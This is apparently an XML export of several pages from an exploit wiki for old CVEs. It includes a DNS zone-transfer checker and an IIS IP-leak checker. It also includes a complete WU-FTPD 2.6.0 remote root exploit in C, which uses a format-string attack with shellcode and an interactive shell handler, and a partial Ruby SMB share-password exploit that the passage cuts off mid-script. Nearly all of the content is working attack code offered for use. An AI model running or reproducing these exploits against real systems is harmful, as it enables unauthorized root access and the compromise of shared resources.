      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/env python ########################################### # Unrestricted DNS Zone Transfer Checker  # #              CVE-1999-0532              # #..."</comment>
      <origin>786</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1503" sha1="shy69vlwcxyhduorlbl78bjh86jjaig" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/env python
###########################################
# Unrestricted DNS Zone Transfer Checker  #
#              CVE-1999-0532              #
#         Researcher: Joel A. Ossi        #
###########################################

import urllib2
import time

f = open('domains.txt', 'r') # text file containing the URLS
for line in f:
    print("")
    print ('Checking: ' + line)
    try:
        # the API File you can get in one of my other repository's
        dns = urllib2.urlopen("https://yourwebsite.com/zonetransfer/index.php?q=" + line).read()
        time.sleep(3) # small interval to prevent WAF Blockade.
        if 'connection timed out; no servers could be reached' in dns:
            print('[-] Transfer Failed. Reason: DNS Server Connection Timed-Out')
        elif 'Transfer failed' in dns:
            print("[-] Transfer failed. Reason: Denied")
        elif 'Error occured while' in dns:
            print('[-] Error: Unknown, Reason: Error occured while getting DNS records')
        elif 'XFR size' in dns:
            print ("[+] VULNERABLE TARGET FOUND: " + line)
            with open('vulnerable.txt', 'a') as vulnerables:
                vulnerables.write(line + '\n')
        else:
            print ("[-] Unknown Error, Blank Page Returned ")
    except urllib2.HTTPError, e:
        print ('[-] Transfer Failed, Reason: Error ' + str(e.code))
    except urllib2.URLError, e:
        print('[-] Connection failed, Reason: ' + str(e.code))

&lt;/pre&gt;</text>
      <sha1>shy69vlwcxyhduorlbl78bjh86jjaig</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2000-0573 WU-FTPD 2.6.0 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1676</id>
    <revision>
      <id>2080</id>
      <timestamp>2021-05-03T13:20:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  * (c) 2000 venglin / b0f  * http://b0f.freebsd.lublin.pl  *  * WUFTPD 2.6.0 REMOTE ROOT EXPLOIT (22/06/2000, updated: 05/08/2000)  *  * Idea and preliminary..."</comment>
      <origin>2080</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10888" sha1="je4fcp1k6rcqsjft03jrm9ezofhrv3f" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
 * (c) 2000 venglin / b0f
 * http://b0f.freebsd.lublin.pl
 *
 * WUFTPD 2.6.0 REMOTE ROOT EXPLOIT (22/06/2000, updated: 05/08/2000)
 *
 * Idea and preliminary version of exploit by tf8
 *
 * Greetz: Lam3rZ, TESO, ADM, lcamtuf, karpio.
 * Dedicated to ksm.
 *
 * **PRIVATE**DO*NOT*DISTRIBUTE**
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;
#include &lt;arpa/inet.h&gt;


#define repln	if (getreply(0) &lt; 0) return -1
#define replv	if (getreply(1) &lt; 0) return -1

#ifdef DEBUG
#define repl replv
#else
#define repl repln
#endif

char usage[] = "usage: bobek [-l login] [-o port] [-f retofs] [-s retlocofs]\n\t&lt;-t type&gt; &lt;hostname&gt;";
char recvbuf[BUFSIZ], sendbuf[BUFSIZ];
FILE *cin, *cout;

char linuxcode[]= /* Lam3rZ chroot() code */
	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
	"\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
	"\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27\xcd"
	"\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb"
	"\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e"
	"\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
	"\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88"
	"\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89"
	"\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31"
	"\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\x30\x62\x69\x6e"
	"\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69"
	"\x6e\x40\x6b\x6f\x63\x68\x61\x6d\x2e\x6b\x61\x73\x69\x65"
	"\x2e\x63\x6f\x6d";

char bsdcode[] = /* Lam3rZ chroot() code rewritten for FreeBSD by venglin */
	"\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43"
	"\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0"
	"\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\x01\x53\x53\xb0\x88"
	"\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80\x31"
	"\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31"
	"\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75\xf1"
	"\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd\x80"
	"\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07"
	"\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
	"\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53\x53"
	"\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\x30\x62\x69\x6e\x30"
	"\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69\x6e"
	"\x40\x6b\x6f\x63\x68\x61\x6d\x2e\x6b\x61\x73\x69\x65\x2e"
	"\x63\x6f\x6d";

struct platforms
{
	char *os;
	char *version;
	char *code;
	int align;
	int eipoff;
	long ret;
	long retloc;
	int sleep;
};

struct platforms targ[] =
{
	{ "FreeBSD 3.4-STABLE", "2.6.0-ports", bsdcode, 2, 1024, 0x80b1f10, 0xbfbfcc04, 0 },
	{ "FreeBSD 5.0-CURRENT", "2.6.0-ports", bsdcode, 2, 1024, 0x80b1510, 0xbfbfec0c, 0 },
	{ "FreeBSD 3.4-STABLE", "2.6.0-packages", bsdcode, 2, 1024, 0x80b1510, 0xbfbfe798, 0 },
	{ "FreeBSD 3.4-STABLE", "2.6.0-venglin", bsdcode, 2, 1024, 0x807078c, 0xbfbfcc04, 0 },
	{ "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbfffcf74, 0 },
	{ "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbfffd074, 0 },
	{ "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbfffcf84, 0 },
	{ "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbfffd04c, 0 },
	{ "RedHat Linux 6.2-SMP", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbfffd0e4, 0 },
	{ NULL, NULL, NULL, 0, 0, 0, 0 }
};

long getip(name)
char *name;
{
	struct hostent *hp;
	long ip;
	extern int h_errno;

	if ((ip = inet_addr(name)) &lt; 0)
	{
		if (!(hp = gethostbyname(name)))
		{
			fprintf(stderr, "gethostbyname(): %s\n",
				strerror(h_errno));
			exit(1);
		}
		memcpy(&amp;ip, (hp-&gt;h_addr), 4);
	}

	return ip;
}

int connecttoftp(host, port)
char *host;
int port;
{
	int sockfd;
	struct sockaddr_in cli;

	bzero(&amp;cli, sizeof(cli));
	cli.sin_family = AF_INET;
	cli.sin_addr.s_addr=getip(host);
	cli.sin_port = htons(port);

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
	{
		perror("socket");
		return -1;
	}

	if(connect(sockfd, (struct sockaddr *)&amp;cli, sizeof(cli)) &lt; 0) 
	{
                perror("connect");
		close(sockfd);
		return -1;
	}

	cin = fdopen(sockfd, "r");
	cout = fdopen(sockfd, "w");

	if (!cin || !cout)
	{
		close(sockfd);
		return -1;
	}

	return sockfd;
}

int command(const char *fmt, ...)
{
	char buf1[BUFSIZ], buf2[BUFSIZ*2], *p, *q;

	va_list args;

	if (!cout)
		return -1;

	bzero(buf1, BUFSIZ);
	bzero(buf2, BUFSIZ*2);

	va_start(args, fmt);
	vsnprintf(buf1, BUFSIZ, fmt, args);
	va_end(args);

	for (p=buf1,q=buf2;*p;p++,q++)
	{
		if (*p == '\xff')
		{
			*q++ = '\xff';
			*q = '\xff';
		}
		else
			*q = *p;
	}

	fprintf(cout, "%s", buf2);

#ifdef DEBUG
	fprintf(stderr, "--&gt; ");
	fprintf(stderr, "%s", buf2);
	fputc('\n', stderr);
#endif

	fputs("\r\n", cout);
	(void)fflush(cout);
	return 0;
}

int getreply(v)
int v;
{
	if (!(fgets(recvbuf, BUFSIZ, cin)))
		return -1;

	if (v)
		fprintf(stderr, "&lt;-- %s", recvbuf);

	return 0;
}

int logintoftp(login, passwd)
char *login, *passwd;
{
	do
		repl;
	while (strncmp(recvbuf, "220 ", 4));

	if ((command("USER %s", login)) &lt; 0)
		return -1;

	repl;

	if (strncmp(recvbuf, "331", 3))
	{
		puts(recvbuf);
		return -1;
	}

	if ((command("PASS %s", passwd) &lt; 0))
		return -1;

	do
		repl;
	while (strncmp(recvbuf, "230 ", 4));

	return 0;
}

int checkvuln(void)
{
	command("SITE EXEC %%p");
	repl;

	if(strncmp(recvbuf, "200-", 4))
		return -1;

	if(strncmp(recvbuf+4, "0x", 2))
		return -1;

	repl;

	return 0;
}

int findeip(eipoff, align)
int eipoff, align;
{
	int i, j, off;
	char *p1;
	char eip1[10], eip2[10];

	for (i=eipoff;;i+=8)
	{
		fprintf(stderr, "at offset %d\n", i);
		strcpy(sendbuf, "SITE EXEC ");
 
		for (j=0;j&lt;align;j++) strcat(sendbuf, "a");
		strcat(sendbuf, "abcd");

		for (j=0;j&lt;eipoff/8;j++) strcat(sendbuf, "%%.f");
		for (j=0;j&lt;(i-eipoff)/8;j++) strcat(sendbuf, "%%d%%d");
		strcat(sendbuf, "|%%.8x|%%.8x");

		if (command(sendbuf) &lt; 0)
			return -1;

		repl;

		if (!(p1 = strchr(recvbuf, '|')))
			return -1;

		strncpy(eip1, p1+1, 8);
		strncpy(eip2, p1+10, 8);

		eip1[8] = eip2[8] = '\0';

		if (!(strcmp(eip1, "64636261")))
		{
			off = i;
			break;
		}

		if (!(strcmp(eip2, "64636261")))
		{
			off = i + 4;
			break;
		}

		repl;
	}

	repl;

	return off;
}

char *putshell(type)
int type;
{
	static char buf[400];
	int noplen;

	char *code = targ[type].code;

	noplen = sizeof(buf) - strlen(code) - 2;

	memset(buf, 0x90, noplen);
	buf[noplen+1] = '\0';
	strcat(buf, code);

	return buf;
}

int overwrite(ptr, off, align, retloc, eipoff)
long ptr, retloc;
int off, align, eipoff;
{
	int i, size = 0;
	char buf[100];

	fprintf(stderr, "RET: %p, RET location: %p,"
		" RET location offset on stack: %d\n",
		(void *)ptr, (void *)retloc, off);

	if (off &gt;= 12)
	{

		strcpy(sendbuf, "SITE EXEC ");

		for (i=0;i&lt;eipoff/8;i++) strcat(sendbuf, "%%.f");
		for (i=0;i&lt;(off-eipoff-8)/8;i++) strcat(sendbuf, "%%d%%d");

		if (((off-eipoff-8) % 8) != 0) strcat(sendbuf, "%%d%%d");

		if (command(sendbuf) &lt; 0)
			return -1;	

		repl;

		size = strlen(recvbuf+4) - 2;

		repl;
	}

	fprintf(stderr, "Reply size: %d, New RET: %p\n", size,
		(void *)(ptr-size));

	strcpy(sendbuf, "SITE EXEC ");
	for (i=0;i&lt;align;i++) strcat(sendbuf, "a");

	sprintf(buf, "%c%c%c%c", ((int)retloc &amp; 0xff),
		(((int)retloc &amp; 0xff00) &gt;&gt; 8),
		(((int)retloc &amp; 0xff0000) &gt;&gt; 16),
		(((int)retloc &amp; 0xff000000) &gt;&gt; 24));

	strcat(sendbuf, buf);

	for (i=0;i&lt;eipoff/8;i++) strcat(sendbuf, "%%.f");
	for (i=0;i&lt;(off-eipoff-8)/8;i++) strcat(sendbuf, "%%d%%d");

	if (((off-eipoff-8) % 8) != 0) strcat(sendbuf, "%%d%%d");

	strcat(sendbuf, "%%.");
	sprintf(buf, "%d", (int)ptr-size);
	strcat(sendbuf, buf);
	strcat(sendbuf, "d%%n");

	if (command(sendbuf) &lt; 0)
		return -1;

	return 0;
}

int sh(sockfd)
int sockfd;
{
	char buf[BUFSIZ];
	int c;
	fd_set rf, drugi;
	char cmd[] = "uname -a ; pwd ; id\n";
        
	FD_ZERO(&amp;rf);
	FD_SET(0, &amp;rf);
	FD_SET(sockfd, &amp;rf);
	write(sockfd, cmd, strlen(cmd));

	while (1)
	{
		bzero(buf, BUFSIZ);
		memcpy (&amp;drugi, &amp;rf, sizeof(rf));
		select(sockfd+1, &amp;drugi, NULL, NULL, NULL);
		if (FD_ISSET(0, &amp;drugi))
		{
			c = read(0, buf, BUFSIZ);
			send(sockfd, buf, c, 0x4);
		}

		if (FD_ISSET(sockfd, &amp;drugi))
		{
			c = read(sockfd, buf, BUFSIZ);
			if (c&lt;0) return 0;
			write(1,buf,c);
		}
	}
}

int main(argc, argv)
int argc;
char **argv;
{
	extern int optind, opterr;
	extern char *optarg;
	int ch, type, port, eipoff, fd, retofs, retlocofs, align, i, retoff;
	long ret, retloc;
	char login[BUFSIZ], password[BUFSIZ];

	opterr = retofs = retlocofs = 0;
	strcpy(login, "ftp");
	type = -1;
	port = 21;

	while ((ch = getopt(argc, argv, "l:f:s:t:o")) != -1)
		switch((char)ch)	
		{
			case 'l':
				strcpy(login, optarg);
				break;

			case 't':
				type = atoi(optarg);
				break;

			case 'o':
				port = atoi(optarg);
				break;

			case 'f':
				retofs = atoi(optarg);
				break;

			case 's':
				retlocofs = atoi(optarg);
				break;

			case '?':
			default:
				puts(usage);
				exit(0);
		}

	argc -= optind;
	argv += optind;

	fprintf(stderr, "PanBobek v1.1 by venglin@freebsd.lublin.pl\n\n");

	if (type &lt; 0)
	{
		fprintf(stderr, "Please select platform:\n");
		for (i=0;targ[i].os;i++)
		{
			fprintf(stderr, "\t-t %d : %s %s (%p / %p)\n", i,
				targ[i].os, targ[i].version,
				(void *)targ[i].ret,
				(void *)targ[i].retloc);
		}
		exit(0);
	}

	fprintf(stderr, "Selected platform: %s with WUFTPD %s\n\n",
		targ[type].os, targ[type].version);

	eipoff = targ[type].eipoff;
	align = targ[type].align;
	ret = targ[type].ret;
	retloc = targ[type].retloc;
	retloc += retlocofs;
	ret += retofs;

	if (argc != 1)
	{
		puts(usage);
		exit(0);
	}

	strcpy(password, putshell(type));

	if ((fd = connecttoftp(*argv, port)) &lt; 0)
	{    
		(void)fprintf(stderr, "Connection to %s failed.\n", *argv);
		exit(1);
	}

	(void)fprintf(stderr, "Connected to %s. Trying to log in.\n", *argv);

	if (logintoftp(login, password) &lt; 0)
	{
		(void)fprintf(stderr, "Logging in to %s (%s) failed.\n",
			*argv, login);
		exit(1);
        }

	(void)fprintf(stderr, "Logged in as %s. Checking vulnerability.\n",
		login);

	sleep(targ[type].sleep);

	if (checkvuln() &lt; 0)
	{
		(void)fprintf(stderr, "Sorry, this version isn't"
			" vulnerable or uses internal vsnprintf().\n");
		exit(1);
	}

	(void)fprintf(stderr, "Ok, trying to find offset (initial: %d)\n",
		eipoff);

	if ((retoff = findeip(eipoff, align)) &lt; 0)
	{
		(void)fprintf(stderr, "\nError finding offset. Adjust"
			" align.\n");
		exit(1);
	}

	if (overwrite(ret, retoff, align, retloc, eipoff) &lt; 0)
	{
		(void)fprintf(stderr, "Error overwriting RET addr.\n");
		exit(1);
	}

	fprintf(stderr, "Wait up to few minutes for reply. It depends on "
			"victim's CPU speed.\nEnjoy your shell.\n");

	sh(fd);

	exit(0);
}


// milw0rm.com [2000-11-21]
            
&lt;/pre&gt;</text>
      <sha1>je4fcp1k6rcqsjft03jrm9ezofhrv3f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2000-0649 Microsoft IIS內部IP地址洩露漏洞</title>
    <ns>0</ns>
    <id>573</id>
    <revision>
      <id>787</id>
      <timestamp>2021-03-31T06:25:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/env python3 # Written by Rafe Hart (@rafael_hart) """ Test an IP address (port 443) for CVE-2000-0649 """  import ssl import socket import re import s..."</comment>
      <origin>787</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1133" sha1="einruj3429nahypgoywnps9rsflywfr" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Written by Rafe Hart (@rafael_hart)
""" Test an IP address (port 443) for CVE-2000-0649 """

import ssl
import socket
import re
import sys

def main():
    if len(sys.argv) == 1:
        print("\nUsage: cve-2000-0643.py &lt;example.com&gt; or &lt;IP&gt;\n")
        sys.exit(1)
    target = sys.argv[1]

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, 443))
        s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
        s.sendall(b'GET / HTTP/1.0\r\n\r\nConnection: close\r\n\r\n')
    except socket.error as exc:
        print("Did't work: %s" % exc)

    while True:
        new = s.recv(4096)
        if not new:
            s.close()
            break
        try:
            response = new.decode()
            pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
            if pattern.search(response):
                print(target, "-&gt;", pattern.search(response).group())
        except:
            sys.exit(1)


if __name__ == '__main__':
    main()

&lt;/pre&gt;</text>
      <sha1>einruj3429nahypgoywnps9rsflywfr</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2000-0979密碼共享漏洞</title>
    <ns>0</ns>
    <id>574</id>
    <revision>
      <id>788</id>
      <timestamp>2021-03-31T06:28:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt;  # this program will exploit CVE-2000-0979. # Exploit was used by Share Password Checker # http://www.securityfriday.com/tools/SPC.html # and by WORM_OPASERV   #..."</comment>
      <origin>788</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12875" sha1="il2uh23r71op4hfos38qzn4dfujtagd" xml:space="preserve">==EXP==
&lt;pre&gt;

# this program will exploit CVE-2000-0979.
# Exploit was used by Share Password Checker
# http://www.securityfriday.com/tools/SPC.html
# and by WORM_OPASERV


#TODO convert to Metasploit

require 'socket'
require 'hexdump'
#Method: Rex::Text.to_hex_dump
#Defined in:
#            lib/rex/text.rb
#permalink .to_hex_dump(str, width = 16, base = nil) ⇒ Object

#require 'pp'

delay = 0.001

puts "Hello CVE-2000-0979"
hex = Hexdump::Dumper.new
RHOST = '192.168.1.113' #'127.0.0.1'
RPORT = 139

$debug = FALSE


socket = TCPSocket.open(RHOST, RPORT)
BUFFER_SIZE = 1000

def debug_puts(message)
  if $debug
    puts message
  end
end

def debug_hex_dump(hex,message)
  if $debug
    puts hex.dump(message)
  end
end

def sock_close(socket)
  debug_puts "Closing the Client..................."
  socket.close                    # Close the socket
end

#todo redo Object oriented
def update_tid(packet, tid)
  tid_arr = tid.unpack('C*')
  packet.map! { |val|
      if val == "tid0" then
        tid_arr[0]
      elsif val == "tid1" then
             tid_arr[1]
           else val
      end
  }
  return packet
end

def update_password(packet, nbs_length,length0, length1, byte_count0, byte_count1,password,
    share)

  new_packet = packet.map { |val|
    if val == "length0" then
      length0
    elsif val == "length1" then
      length1
    elsif val == "byte_count0" then
      byte_count0
    elsif val == "byte_count1" then
      byte_count1
    elsif val == "nbs_length" then
      nbs_length
    else val
    end

  }

  share_chars = share.chars.map {|val|
    val.ord
  }

  new_packet.insert(new_packet.find_index("share"),share_chars).flatten!
  new_packet.delete_at(new_packet.find_index("share"))

  new_packet.insert(new_packet.find_index("password"),password).flatten!
  new_packet.delete_at(new_packet.find_index("password"))

  return new_packet
end

def update_machine_name(packet,machine_name)
  packet.insert(packet.find_index("machine_name"),machine_name).flatten!
  packet.delete_at(packet.find_index("machine_name"))
  return packet
end

def send_and_receive(socket, packet)
  hex = Hexdump::Dumper.new

  debug_puts "\nFinal client data "
  debug_hex_dump(hex,packet.pack('C*').to_s)

  socket.send packet.pack('C*'),0
  response = socket.recvfrom(BUFFER_SIZE)

  debug_puts "\nServer response\n"
  debug_hex_dump(hex,response.first.to_s)

  return response
end



tree_disconnect_request = [0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,
                           0x71, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0xc8, 0xff, 0xfe,
                           0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00 ]

machine_name = 32.times.map{ 0x41 + Random.rand(6) }

session_request_def = [0x81, 0x00, 0x00, 0x44, 0x20, 0x45, 0x45, 0x45,
                       0x46, 0x45, 0x47, 0x45, 0x42, 0x46, 0x46, 0x45,
                       0x4d, 0x46, 0x45, 0x43, 0x41, 0x43, 0x41, 0x43,
                       0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43,
                       0x41, 0x43, 0x41, 0x43, 0x41, 0x00, 0x20,  "machine_name", 0x00]

session_request_def = update_machine_name(session_request_def,machine_name)

neg_prot_req = [0x00, 0x00, 0x00, 0x2f, 0xff, 0x53, 0x4d, 0x42,
                0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xc8,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x02, 0x4e, 0x54,
                0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32,
                0x00]

sess_setup_andx_req = [0x00, 0x00, 0x00, 0x9d, 0xff, 0x53, 0x4d, 0x42,
                       0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe,
                       0x00, 0x00, 0x04, 0x00, 0x0d, 0x75, 0x00, 0x74,
                       0x00, 0x68, 0x0b, 0x02, 0x00, 0x00, 0x00, 0x09,
                       0x06, 0x03, 0x80, 0x01, 0x00, 0x01, 0x00, 0x00,
                       0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x37,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e,
                       0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30,
                       0x30, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63,
                       0x65, 0x20, 0x50, 0x61, 0x63, 0x6b, 0x20, 0x33,
                       0x20, 0x32, 0x36, 0x30, 0x30, 0x00, 0x57, 0x69,
                       0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30,
                       0x30, 0x30, 0x20, 0x35, 0x2e, 0x31, 0x00, 0x00,
                       0x04, 0xff, 0x00, 0x9d, 0x00, 0x08, 0x00, 0x01,
                       0x00, 0x1e, 0x00, 0x00, 0x5c, 0x5c, 0x31, 0x39,
                       0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x32,
                       0x32, 0x2e, 0x31, 0x34, 0x31, 0x5c, 0x49, 0x50,
                       0x43, 0x24, 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f,
                       0x00 ]

netshareenum_request = [0x00, 0x00, 0x00, 0x63, 0xff, 0x53, 0x4d, 0x42,
                       0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0x00, 0x00, 0x00, 0x00, "tid0", "tid1", 0xff, 0xfe,
                       0x00, 0x00, 0x14, 0x00, 0x0e, 0x13, 0x00, 0x00,
                       0x00, 0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
                       0x00, 0x88, 0x13, 0x00, 0x00, 0x00, 0x00, 0x13,
                       0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0x00, 0x24, 0x00, 0x5c, 0x50, 0x49, 0x50, 0x45,
                       0x5c, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x00,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x72,
                       0x4c, 0x65, 0x68, 0x00, 0x42, 0x31, 0x33, 0x42,
                       0x57, 0x7a, 0x00, 0x01, 0x00, 0x00, 0x10]

sess_setup_andx_req_anon = [0x00, 0x00, 0x00, 0x60, 0xff, 0x53, 0x4d, 0x42,
                            0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x0b,
                            0x00, 0x00, 0x01, 0x00, 0x0a, 0xff, 0x00, 0x00,
                            0x00, 0x68, 0x0b, 0x02, 0x00, 0x01, 0x00, 0x0a,
                            0x06, 0x02, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00,
                            0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20,
                            0x32, 0x30, 0x30, 0x30, 0x20, 0x32, 0x31, 0x39,
                            0x35, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x64, 0x6f,
                            0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 0x30, 0x20,
                            0x35, 0x2e, 0x30, 0x00]

tree_connect_request_path_password = [0x00, 0x00, 0x00, "nbs_length", 0xff, 0x53, 0x4d, 0x42,
                                      0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x0b,
                                      0x00, 0x00, 0x01, 0x00, 0x04, 0xff, 0x00, 0x00,
                                      0x00, 0x00, 0x00,
                                      "length0", "length1", "byte_count0", "byte_count1","password",
                                      "share", 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00]

tree_disconnect = [0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,
                   0x71, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, "tid0", "tid1", 0xc0, 0x0b,
                   0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00]

myhash = {}

@client_packets = [{ "tree_disconnect_request" =&gt; tree_disconnect_request},
                  {"close1" =&gt; "close"},
                  {"session_request_def" =&gt; session_request_def},
                  {"neg_prot_req" =&gt; neg_prot_req},
                  {"sess_setup_andx_req" =&gt; sess_setup_andx_req},
                  {"netshareenum_request" =&gt; netshareenum_request},
                  {"close3" =&gt; "close"},
                  {"session_request_2" =&gt; session_request_def},
                  {"neg_prot_req_2" =&gt; neg_prot_req},
                  {"sess_setup_andx_req_anon" =&gt; sess_setup_andx_req_anon}
                   ]

i = 0
tid = 0
length0, length1, byte_count0, byte_count1,password, share = 0
shares = Array.new

@client_packets.each_with_index { |val, idx|
  begin
    if val[val.keys[0]].to_s == "close" and socket then
      sock_close(socket)  #close
      debug_puts "Opening socket again"
      socket = TCPSocket.open(RHOST, RPORT) #open new
      next
    elsif  !socket
      debug_puts "Opening socket again"
      socket = TCPSocket.open(RHOST, RPORT) #open new
      next
    end

    if [ 'netshareenum_request'].include? val.keys[0] then

      #update TID in packets
      packet = update_tid(val[val.keys[0]], tid)
      debug_puts "Packet updated"

    else
      packet = val[val.keys[0]]
    end

    debug_puts "\nclient data\n"
    debug_puts val.keys[0]
    response = send_and_receive(socket,packet)

    if val.keys[0] == "sess_setup_andx_req" then
      tid = response.first[28..29]
      debug_puts "New tree ID TID !!!!!"
      debug_hex_dump(hex,tid)
    end

    if val.keys[0] == "session_request_def" then
      session_response = response.first[0]
      if (session_response.ord != 0x82) then
        puts "Session response is not positive! Exiting."
        exit(0)
      end
    end

    if val.keys[0] == "neg_prot_req" then
      error_class = response.first[9]
      if (error_class.ord != 0x0) then
        puts "Error in negotiation! Exiting."
        exit(0)
      end
    end

    if val.keys[0] == "netshareenum_request" then
      num_of_shares = response.first[65..66].unpack('cc').first
      print "Number of shares: "
      puts num_of_shares
      puts "Share names: "
      num_of_shares.times do |n|
        offset = (n * 20) + 68
        share_name = response.first[offset..offset+15]
        shares.push(share_name)
        puts "\t" + share_name
      end

    end

